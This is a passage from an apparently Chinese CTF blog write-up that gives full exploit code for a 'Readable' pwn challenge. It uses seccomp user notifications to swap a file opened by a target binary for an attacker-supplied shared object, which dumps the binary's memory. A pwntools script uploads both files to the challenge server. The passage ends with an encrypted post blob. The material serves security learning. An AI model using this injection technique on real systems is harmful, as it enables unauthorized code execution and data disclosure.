class="hljs-meta">  do &#123;                  \</span><br><span class="hljs-meta">    perror(msg);        \</span><br><span class="hljs-meta">    exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">  &#125; while (0)</span><br><br><span class="hljs-comment">/* Send the file descriptor &#x27;fd&#x27; over the connected UNIX domain socket</span><br><span class="hljs-comment">  &#x27;sockfd&#x27;. Returns 0 on success, or -1 on error. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sendfd</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">int</span> fd)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-type">int</span> data;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* Allocate a char array of suitable size to hold the ancillary data.</span><br><span class="hljs-comment">     However, since this buffer is in reality a &#x27;struct cmsghdr&#x27;, use a</span><br><span class="hljs-comment">     union to ensure that it is suitably aligned. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>    <span class="hljs-type">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>))];<br>    <span class="hljs-comment">/* Space large enough to hold an &#x27;int&#x27; */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to specify the address of the</span><br><span class="hljs-comment">     destination socket when sending a datagram. However, we do not</span><br><span class="hljs-comment">     need to use this field because &#x27;sockfd&#x27; is a connected socket. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* On Linux, we must transmit at least one byte of real data in</span><br><span class="hljs-comment">     order to send ancillary data. We transmit an arbitrary integer</span><br><span class="hljs-comment">     whose value is ignored by recvfd(). */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data;<br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>);<br>  data = <span class="hljs-number">12345</span>;<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Set up ancillary data describing file descriptor to send */</span><br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br>  cmsgp-&gt;cmsg_level = SOL_SOCKET;<br>  cmsgp-&gt;cmsg_type = SCM_RIGHTS;<br>  cmsgp-&gt;cmsg_len = CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>  <span class="hljs-built_in">memcpy</span>(CMSG_DATA(cmsgp), &amp;fd, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>  <span class="hljs-comment">/* Send real plus ancillary data */</span><br><br>  <span class="hljs-keyword">if</span> (sendmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* Receive a file descriptor on a connected UNIX domain socket. Returns</span><br><span class="hljs-comment">  the received file descriptor on success, or -1 on error. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">recvfd</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-type">int</span> data, fd;<br>  <span class="hljs-type">ssize_t</span> nr;<br><br>  <span class="hljs-comment">/* Allocate a char buffer for the ancillary data. See the comments</span><br><span class="hljs-comment">     in sendfd() */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>    <span class="hljs-type">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>))];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to obtain the address of the</span><br><span class="hljs-comment">     sending socket. However, we do not need this information. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* Specify buffer for receiving real data */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data; <span class="hljs-comment">/* Real data is an &#x27;int&#x27; */</span><br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>);<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Receive real plus ancillary data; real data is ignored */</span><br><br>  nr = recvmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br><br>  <span class="hljs-comment">/* Check the validity of the &#x27;cmsghdr&#x27; */</span><br><br>  <span class="hljs-keyword">if</span> (cmsgp == <span class="hljs-literal">NULL</span> || cmsgp-&gt;cmsg_len != CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>)) ||<br>      cmsgp-&gt;cmsg_level != SOL_SOCKET || cmsgp-&gt;cmsg_type != SCM_RIGHTS) &#123;<br>    errno = EINVAL;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">/* Return the received file descriptor to our caller */</span><br><br>  <span class="hljs-built_in">memcpy</span>(&amp;fd, CMSG_DATA(cmsgp), <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>  <span class="hljs-keyword">return</span> fd;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sigchldHandler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> &#123;<br>  <span class="hljs-comment">// char msg[] = &quot;\tS: target has terminated; bye\n&quot;;</span><br><br>  <span class="hljs-comment">// write(STDOUT_FILENO, msg, sizeof(msg) - 1);</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Child exited&quot;</span>);<br>  _exit(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">seccomp</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> operation, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">void</span> *args)</span> &#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_seccomp, operation, flags, args);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> X32_SYSCALL_BIT 0x40000000</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR                                  \</span><br><span class="hljs-meta">  BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),   \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 0, 2),            \</span><br><span class="hljs-meta">      BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))), \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, X32_SYSCALL_BIT, 0, 1),              \</span><br><span class="hljs-meta">      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">installNotifyFilter</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> &#123;<br>      X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR,<br><br>      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_USER_NOTIF),<br><br>      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),<br>  &#125;;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span> =</span> &#123;<br>      .len = <span class="hljs-keyword">sizeof</span>(filter) / <span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>]),<br>      .filter = filter,<br>  &#125;;<br><br>  <span class="hljs-type">int</span> notifyFd =<br>      seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &amp;prog);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;seccomp-install-notify-filter&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> notifyFd;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">closeSocketPair</span><span class="hljs-params">(<span class="hljs-type">int</span> sockPair[<span class="hljs-number">2</span>])</span> &#123;<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">0</span>]) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;closeSocketPair-close-0&quot;</span>);<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">1</span>]) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;closeSocketPair-close-1&quot;</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pid_t</span> <span class="hljs-title function_">targetProcess</span><span class="hljs-params">(<span class="hljs-type">int</span> sockPair[<span class="hljs-number">2</span>], <span class="hljs-type">char</span> *argv[])</span> &#123;<br>  <span class="hljs-type">pid_t</span> targetPid = fork();<br>  <span class="hljs-keyword">if</span> (targetPid == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;fork&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (targetPid &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">/* In parent, return PID of child */</span><br>    <span class="hljs-keyword">return</span> targetPid;<br><br>  <span class="hljs-keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) errExit(<span class="hljs-string">&quot;prctl&quot;</span>);<br><br>  <span class="hljs-type">int</span> notifyFd = installNotifyFilter();<br><br>  <span class="hljs-keyword">if</span> (sendfd(sockPair[<span class="hljs-number">0</span>], notifyFd) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;sendfd&quot;</span>);<br><br>  <span class="hljs-comment">/* Notification and socket FDs are no longer needed in target */</span><br><br>  <span class="hljs-keyword">if</span> (close(notifyFd) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;close-target-notify-fd&quot;</span>);<br><br>  closeSocketPair(sockPair);<br><br>  <span class="hljs-comment">/* Perform a mkdir() call for each of the command-line arguments */</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Executing child&quot;</span>);<br>  sleep(<span class="hljs-number">1</span>);<br>  <span class="hljs-type">char</span> *f = <span class="hljs-literal">NULL</span>;<br>  execve(<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>, &amp;f, &amp;f);<br>  <span class="hljs-comment">// openat(AT_FDCWD,&quot;/bin/bash&quot;,0);</span><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">allocSeccompNotifBuffers</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seccomp_notif **req,</span><br><span class="hljs-params">                                     <span class="hljs-keyword">struct</span> seccomp_notif_resp **resp,</span><br><span class="hljs-params">                                     <span class="hljs-keyword">struct</span> seccomp_notif_sizes *sizes)</span> &#123;<br>  <span class="hljs-keyword">if</span> (seccomp(SECCOMP_GET_NOTIF_SIZES, <span class="hljs-number">0</span>, sizes) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;seccomp-SECCOMP_GET_NOTIF_SIZES&quot;</span>);<br><br>  *req = <span class="hljs-built_in">malloc</span>(sizes-&gt;seccomp_notif);<br>  <span class="hljs-keyword">if</span> (*req == <span class="hljs-literal">NULL</span>) errExit(<span class="hljs-string">&quot;malloc-seccomp_notif&quot;</span>);<br><br>  <span class="hljs-type">size_t</span> resp_size = sizes-&gt;seccomp_notif_resp;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> seccomp_notif_resp) &gt; resp_size)<br>    resp_size = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> seccomp_notif_resp);<br><br>  *resp = <span class="hljs-built_in">malloc</span>(resp_size);<br>  <span class="hljs-keyword">if</span> (resp == <span class="hljs-literal">NULL</span>) errExit(<span class="hljs-string">&quot;malloc-seccomp_notif_resp&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">handleNotifications</span><span class="hljs-params">(<span class="hljs-type">int</span> notifyFd)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_sizes</span> <span class="hljs-title">sizes</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif</span> *<span class="hljs-title">req</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_resp</span> *<span class="hljs-title">resp</span>;</span><br>  <span class="hljs-type">char</span> path[PATH_MAX];<br><br>  allocSeccompNotifBuffers(&amp;req, &amp;resp, &amp;sizes);<br><br>  <span class="hljs-comment">/* Loop handling notifications */</span><br><br>  <span class="hljs-keyword">for</span> (;;) &#123;<br>    <span class="hljs-comment">/* Wait for next notification, returning info in &#x27;*req&#x27; */</span><br><br>    <span class="hljs-built_in">memset</span>(req, <span class="hljs-number">0</span>, sizes.seccomp_notif);<br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_RECV, req) == <span class="hljs-number">-1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (errno == EINTR) <span class="hljs-keyword">continue</span>;<br>      errExit(<span class="hljs-string">&quot;\tS: ioctl-SECCOMP_IOCTL_NOTIF_RECV&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (req-&gt;data.nr != __NR_openat) &#123;<br>      <span class="hljs-built_in">printf</span>(<br>          <span class="hljs-string">&quot;\tS: notification contained unexpected &quot;</span><br>          <span class="hljs-string">&quot;system call number; bye!!!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_addfd</span> <span class="hljs-title">addfd</span>;</span><br>    addfd.id = req-&gt;id; <span class="hljs-comment">/* Cookie from SECCOMP_IOCTL_NOTIF_RECV */</span><br>    addfd.srcfd = openat(req-&gt;data.args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;/tmp/payload&quot;</span>, req-&gt;data.args[<span class="hljs-number">2</span>],req-&gt;data.args[<span class="hljs-number">3</span>]);<br>    addfd.newfd = <span class="hljs-number">3</span>;<br>    addfd.flags = SECCOMP_ADDFD_FLAG_SETFD;<br>    addfd.newfd_flags = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> a2 = ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_ADDFD, &amp;addfd);<br><br>    resp-&gt;id = req-&gt;id;<br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br>    resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;error = resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;val = a2;<br><br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_SEND, resp) == <span class="hljs-number">-1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (errno == ENOENT)<br>        <span class="hljs-built_in">printf</span>(<br>            <span class="hljs-string">&quot;\tS: response failed with ENOENT; &quot;</span><br>            <span class="hljs-string">&quot;perhaps target process&#x27;s syscall was &quot;</span><br>            <span class="hljs-string">&quot;interrupted by a signal?\n&quot;</span>);<br>      <span class="hljs-keyword">else</span><br>        perror(<span class="hljs-string">&quot;ioctl-SECCOMP_IOCTL_NOTIF_SEND&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-built_in">free</span>(req);<br>  <span class="hljs-built_in">free</span>(resp);<br>  <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* Implementation of the supervisor process:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  (1) obtains the notification file descriptor from &#x27;sockPair[1]&#x27;</span><br><span class="hljs-comment">  (2) handles notifications that arrive on that file descriptor. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">supervisor</span><span class="hljs-params">(<span class="hljs-type">int</span> sockPair[<span class="hljs-number">2</span>])</span> &#123;<br>  <span class="hljs-type">int</span> notifyFd = recvfd(sockPair[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;recvfd&quot;</span>);<br><br>  closeSocketPair(sockPair); <span class="hljs-comment">/* We no longer need the socket pair */</span><br><br>  handleNotifications(notifyFd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">readBinary</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-type">int</span> sz,readed;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size:&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;sz);<br>  <span class="hljs-type">char</span> *buf = <span class="hljs-built_in">malloc</span>(sz);<br><br>  <span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;/tmp/payload&quot;</span>,O_WRONLY|O_CREAT,<span class="hljs-number">0777</span>);<br>  <span class="hljs-keyword">while</span>(sz &gt; <span class="hljs-number">0</span>)&#123;<br>    readed = read(<span class="hljs-number">0</span>,buf,sz);<br>    write(f,buf,readed);<br>    sz -= readed;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>  <span class="hljs-type">int</span> sockPair[<span class="hljs-number">2</span>];<br><br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>  readBinary();<br>  <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sockPair) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;socketpair&quot;</span>);<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span><br>  sa.sa_handler = sigchldHandler;<br>  sa.sa_flags = <span class="hljs-number">0</span>;<br>  sigemptyset(&amp;sa.sa_mask);<br>  <span class="hljs-keyword">if</span> (sigaction(SIGCHLD, &amp;sa, <span class="hljs-literal">NULL</span>) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;sigaction&quot;</span>);<br>  targetProcess(sockPair, &amp;argv[optind]);<br><br>  supervisor(sockPair);<br><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// payload.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/unistd.h&gt;</span></span><br><br>__asm__(<span class="hljs-string">&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_2.34&quot;</span>);<br>__asm__(<span class="hljs-string">&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_2.2.5&quot;</span>);<br>__asm__(<span class="hljs-string">&quot;.symver puts_impl,puts@GLIBC_2.2.5&quot;</span>);<br><br><br><span class="hljs-type">void</span> __libc_start_main_impl()&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;.intel_syntax noprefix&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rax,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rsi,rdi&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdi,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdx,0x1000&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;syscall&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">puts_impl</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;.intel_syntax noprefix&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rax,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov qword ptr [rax],1&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> os<br><br>os.system(<span class="hljs-string">&#x27;gcc ./payload.c -shared -Wl,--version-script,payload.map -o ./payload&#x27;</span>)<br>os.system(<span class="hljs-string">&#x27;gcc ./exploit.c -o ./exploit&#x27;</span>)<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./exploit&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>r = remote(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<span class="hljs-number">9000</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(f)))<br>time.sleep(<span class="hljs-number">1</span>)<br>r.send(f)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./payload&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br>r.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(f)))<br>time.sleep(<span class="hljs-number">1</span>)<br>r.send(f)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>æ•´ä½“æ€æƒ³è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œé€šè¿‡ <code>SECCOMP_IOCTL_NOTIF_ADDFD</code> å»åŠ«æŒ openatï¼Œè¿”å›æˆ‘ä»¬çš„æ¶æ„ payloadï¼Œå®ç°ç±»ä¼¼ <code>LD_PROLOAD</code> çš„æ•ˆæœã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221019165240559.png" alt="image-20221019165240559"></p><h2 id="jsy-5-solves-Workingâ€¦"><a class="header-anchor" href="#jsy-5-solves-Workingâ€¦">Â¶</a>jsy(5 solves)(Workingâ€¦)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016122254774.png" alt="image-20221016122254774"></p><h2 id="å‚è€ƒé“¾æ¥"><a class="header-anchor" href="#å‚è€ƒé“¾æ¥">Â¶</a>å‚è€ƒé“¾æ¥</h2><h3 id="Readable"><a class="header-anchor" href="#Readable">Â¶</a>Readable</h3><ul><li><p><a href="https://github.com/justcatthefish/justctf-2022/tree/main/challenges/pwn_dumpme">JustCTF2022 - pwn_dumpme</a></p></li><li><p><a href="https://linux.die.net/man/8/ld.so">ld.so æ–‡æ¡£ - man</a></p></li><li><p><a href="https://www.kernel.org/doc/Documentation/prctl/no_new_privs.txt">PR_SET_NO_NEW_PRIVS</a></p></li><li><p><a href="http://just4coding.com/2022/04/03/seccomp/">Seccompæœºåˆ¶ä¸seccomp notifyä»‹ç» - Just For Coding</a></p></li><li><p><a href="https://brauner.github.io/2020/07/23/seccomp-notify.html">The Seccomp Notifier - New Frontiers in Unprivileged Container Development</a></p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux Kernel Exploit å­¦ä¹ </title>
    <link href="/posts/bb063645.html"/>
    <url>/posts/bb063645.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å†ç­‰ç­‰ XD" data-whm="Incorrect Password">  <script id="hbeData" type="hbeData" data-hmacdigest="0ebbd5510f1d17e2c0b15727d75650ef3946f2e623389c353a82446f9323a01c">61796d173c0eb5749165bf3aa4b5a13a49f200b5eb078a42b7921b25791456bce2d3095b694fad18725b55c4771059213eabe24127e37d11f9f69c1a5b2ab468182489c2c96fff33bb91696523c7ba878e207bbea7b60a7eac51678b578b4c1f691bc7fd7a5230c9051cbfdbf103cb8d484e8949ffa58232efa878627f572a20d7349c31b0eb5cb465d5464179a9f1b7fc47da83eb4bf59832ecc82a674278da9d4aeab7fb400deddb39de0e38955a2f46ab69675d1a3786b52b01297d72d8bffdb128df21568be408192cd8ffc17b3521be8fab4e009fb2822aa5a4fe86209d01cf68331fa06c3b551dfed441a351fe358a1b04a16a1e59d9e45589fea655bae01a95ded9ad512eeec1f0b1fe0547e55e211fb4a0473ca5f5ee57cea94e6cc9e05e990754bb9a954e9345eaaee06fee7eb740613aaea81df573e674b99c7d17a9553fcfd05a33b94f8eef04a6fa11bce33b554e772c9e0ca527865040e081f1abb06e454e1d65d8e8f4306e1b706b6c9c6817fa1b7fe5d44e288c9f4a9b736460da994c7e9ab15f5818f441f76a64595b36fd6ed2607168ee718bdd500e9c8a36e39eadc19138c81879e5b684a1441344c280f9503535262e61a01f9b1f53c0f23dab482e6a566c7e7d1c23589749f288624377f26d8f456188e10d47bd20ae65cfe3a66d7f5f66eec565881768052494a50d97b903b944695e03ef6d700f3882bd27d6d121f2d66f1be98418deff3df393eb2fbb6afe769e03d1e64d08061ecc2c93c548c2ca5d040b94f39df9634577e1ad6402214d05aea0770371f582d1140e606be9236bc502fc6367c7737a11d193f146765978c7e72c4b33973afa9a2438871abcbdd649291720a7b0d7e7b47b389ff290db37a405c79db7a3cd6f437e093b4bd2b977e7a2972fa03f0f59f12b56307ab8baaa34f7a9a97f25c21be5e197b50cdbaa4178bc688dbad9f56cc9a1025caac442d3614418249e24dabf0b37e32f453616bf57ade0565d28205a2e72ea28b7c207937d319ffbf75d385bdc2bd240f4d4e44bee3